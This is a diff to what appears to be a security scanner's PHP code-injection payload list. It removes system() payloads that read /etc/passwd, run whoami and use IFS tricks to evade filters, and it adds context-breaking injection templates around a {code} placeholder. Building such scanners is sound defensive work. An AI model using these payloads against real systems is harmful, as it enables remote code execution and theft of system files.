@@ -1,8 +1,16 @@
-system('/bin/echo%20\"drake\"')
-system('/bin/cat%20/etc/passwd')
-system('echo%20\"drake\"')
-system('whoami')
-system('IFS=,;`cat<<<uname,-a`')
-system('${@print(md5(RCEVulnerable))}')
-system('cat$IFS/etc/passwd')
-system('ping%CommonProgramFiles:~10,-18%IP')
+# Context templates for the phpi module (files/payload-db/php_payloads.lst).
+# {code} is replaced by a PHP expression such as print(12345*67890); a finding
+# needs the computed result in the response, never the literal payload.
+{code}
+{code};
+;{code};
+';{code};//
+";{code};//
+'.{code}.'
+".{code}."
+${@{code}}
+{${{code}}}
+);{code};//
+');{code};//
+");{code};//
+?><?php {code};?>
